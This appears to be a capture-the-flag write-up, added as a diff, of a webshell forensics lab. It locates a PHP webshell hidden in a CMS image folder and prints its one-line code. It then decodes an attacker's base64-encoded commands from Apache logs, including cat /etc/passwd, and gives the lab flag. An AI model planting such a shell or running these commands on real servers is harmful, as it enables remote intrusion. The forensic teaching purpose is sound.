@@ -1,0 +1,133 @@
+Investigation Steps and Findings
+1. Identifying the Web Shell
+Objective: Locate any suspicious files that could serve as a webshell.
+
+Action:
+We started by navigating to the web root directory, which is typically /var/www/html on Linux-based web servers like the one in this room. Within this directory, we found CMSsite-master. Given that webshells are often disguised as legitimate files and uploaded to publicly accessible directories, we checked inside CMSsite-master/img/.
+
+Bash
+
+ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ ls -la
+Reasoning:
+
+/var/www/html: This is the default document root for Apache web servers on Ubuntu. It's the primary location where web application files are stored.
+
+CMSsite-master/img/: Web shells are frequently uploaded to directories that are writable by the web server process and are expected to contain files that might evade immediate suspicion (like images). An img directory is a common place for attackers to hide malicious PHP files by naming them similarly to image files (e.g., images.php or shell.jpg.php).
+
+Finding:
+Among the image files, images.php immediately stood out. Its .php extension in a directory primarily for images is highly unusual and indicative of a potential webshell.
+
+We then inspected its content:
+
+Bash
+
+ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ cat images.php
+<?php system(base64_decode($_GET['query'])); ?>
+Reasoning:
+
+cat images.php: Directly viewing the file's content allows us to confirm its malicious nature.
+
+<?php system(base64_decode($_GET['query'])); ?>: This is a classic and very simple webshell.
+
+$_GET['query']: It takes input directly from the URL query parameter named query. This means an attacker can provide commands in the URL.
+
+base64_decode(): The input from the query parameter is first base64-decoded. This is a common technique used by attackers to evade simple string-based detections and make their commands less immediately obvious in logs.
+
+system(): This PHP function executes an external program and outputs the result. This is the core functionality that allows for remote code execution.
+
+Conclusion for Step 1: The images.php file is confirmed to be a functional webshell, allowing remote command execution via a base64-encoded query parameter.
+
+2. Analyzing Apache Logs
+Objective: Discover how and when the webshell was used by the attacker.
+
+Action:
+Web server logs are crucial for understanding user activity, including malicious requests. On Ubuntu systems running Apache, access logs are typically found in /var/log/apache2/.
+
+Bash
+
+ubuntu@tryhackme:/var/log/apache2$ cd /var/log/apache2/
+ubuntu@tryhackme:/var/log/apache2$ ls -la
+Reasoning:
+
+/var/log/apache2/: This is the standard location for Apache web server logs on Debian/Ubuntu systems. These logs record every request made to the web server, including the URL requested, the HTTP method, the response status code, and the user agent.
+
+ls -la: Listing all files, including hidden ones (.) and providing long format details (-l), helps identify specific log files and their sizes/modification times.
+
+other_vhosts_access.log.1: Among the listed logs, other_vhosts_access.log.1 is a common log file for virtual hosts (which could include the CMS site). The .1 suffix indicates it's a rotated log file, containing older entries that might be relevant to an initial compromise.
+
+We then examined the content of this specific log file:
+
+Bash
+
+ubuntu@tryhackme:/var/log/apache2$ cat other_vhosts_access.log.1
+Reasoning:
+
+cat other_vhosts_access.log.1: This command displays the entire content of the log file, allowing us to manually review entries or pipe them to other tools for filtering.
+
+3. Deciphering Attacker Commands
+Objective: Extract and decode the commands executed by the attacker using the webshell from the Apache logs.
+
+Action:
+We carefully reviewed the log entries, specifically looking for GET requests to /CMSsite-master/img/images.php that included a query parameter.
+
+Reasoning:
+
+"GET /CMSsite-master/img/images.php?query=": This pattern indicates that the webshell was being accessed, and a base64-encoded command was being passed as the query argument. The webshell's PHP code (system(base64_decode($_GET['query']))) explicitly tells us to look for this.
+
+Finding & Decoding:
+
+We found a series of entries that showed successful (HTTP 200) interactions with images.php using the query parameter:
+
+Initial Reconnaissance - whoami:
+
+ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:50:57 +0000] "GET /CMSsite-master/img/images.php?query=d2hvYW1pCg== HTTP/1.1" 200 212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+Decoding d2hvYW1pCg== (e.g., using echo "d2hvYW1pCg==" | base64 -d in a terminal or an online decoder like CyberChef) yields:
+
+whoami
+Note: Attackers often start with whoami to determine the user privileges they have on the compromised system.
+
+Directory Listing - ls:
+
+ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:11 +0000] "GET /CMSsite-master/img/images.php?query=bHMK HTTP/1.1" 200 660 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+Decoding bHMK yields:
+
+ls
+Note: ls is a common command for reconnaissance, allowing the attacker to see what files are in the current directory.
+
+Network Configuration - ifconfig:
+
+ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:28 +0000] "GET /CMSsite-master/img/images.php?query=aWZjb25maWcK HTTP/1.1" 200 203 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+Decoding aWZjb25maWcK yields:
+
+ifconfig
+Note: ifconfig provides information about network interfaces, which can be useful for internal network mapping or identifying potential outbound connections.
+
+System File Access - cat /etc/passwd:
+
+ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:40 +0000] "GET /CMSsite-master/img/images.php?query=Y2F0IC9ldGMvcGFzc3dkCg== HTTP/1.1" 200 1546 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+Decoding Y2F0IC9ldGMvcGFzc3dkCg== yields:
+
+cat /etc/passwd
+Note: Reading /etc/passwd is a common step for attackers to enumerate system users.
+
+User ID - id:
+
+ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:47 +0000] "GET /CMSsite-master/img/images.php?query=aWQK HTTP/1.1" 200 258 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+Decoding aWQK yields:
+
+id
+Note: Similar to whoami, id provides more detailed information about the user and their group memberships, which is useful for privilege escalation.
+
+Flag Retrieval - echo 'THM{sup3r_34sy_w3bsh3ll}':
+
+ip-10-10-80-94.eu-west-1.compute.internal:80 10.11.93.143 - - [06/Mar/2025:09:51:20 +0000] "GET /CMSsite-master/img/images.php?query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdwNic2gzbGx9Jwo= HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+Decoding ZWNobyAnVEhNe3N1cDNyXzM0c3lfdwNic2gzbGx9Jwo= reveals the command used by the attacker:
+
+echo 'THM{sup3r_34sy_w3bsh3ll}'
+Note: This is the most direct evidence of the flag being retrieved. Attackers often use echo to print sensitive information, like flags, to their console or the HTTP response.
+
+Conclusion
+The investigation successfully identified the images.php file as the implanted webshell, confirming it allowed for remote code execution. By meticulously analyzing the other_vhosts_access.log.1 Apache log and decoding the base64-encoded query parameters, we were able to reconstruct the attacker's actions, from initial reconnaissance to the final retrieval of the flag. This hands-on exercise demonstrated key steps in webshell forensic analysis.
+
+Flag
+The flag is:
